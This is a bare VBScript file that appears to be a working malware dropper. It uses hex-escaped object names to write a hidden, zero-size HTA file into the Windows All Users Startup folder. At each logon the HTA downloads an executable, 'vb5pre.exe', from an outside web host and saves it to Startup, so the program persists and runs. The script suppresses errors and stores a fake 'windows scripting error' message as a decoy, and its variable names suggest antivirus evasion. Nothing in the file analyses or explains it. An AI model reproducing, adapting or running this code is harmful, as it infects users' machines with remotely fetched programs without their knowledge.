on error resume next
set gohomekaspersky1 = CreateObject(unescape("%41%44%4F%44%42%2E%52%65%63%6F%72%64%73%65%74"))
With gohomekaspersky1
.Fields.Append "gohomekaspersky1", 200, "3000"
Call .Open
Call .AddNew
.Fields("gohomekaspersky1").Value = "windows scripting error. close to resume!"
Call .AddNew
.Fields("gohomekaspersky1").Value = "<HTA:APPLICATION SHOWINTASKBAR='no' WINDOWSTATE='minimize' border='none' top='5000' left='5000' width='0' height='0'><script language=vbscript>: on error resume next : self.MoveTo 5000, 5000 : dim  first : first=unescape(""%6D%73%78%6D%6C%32%2E%58%4D%4C%48%54%54%50"") : set o = CreateObject(first) : dim exe : exe=""vb5pre.exe"" : o.open ""GET"",""http://111.com.my/cs/platform/source/bin/"" & exe,False : dim second : second=unescape(""%61%64%6F%64%62%2E%73%74%72%65%61%6D"") : o.send : set s = createobject(second) : s.type=1 : s.open : s.write o.responseBody : s.savetofile ""C:\Documents and Settings\All Users\Start Menu\Programs\Startup\"" & exe,1 : window.close: </script>"
Call .Update
End With
gohomekaspersky1.Save "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\vb5preld.hta",adPersistXML
gohomekaspersky1.Close

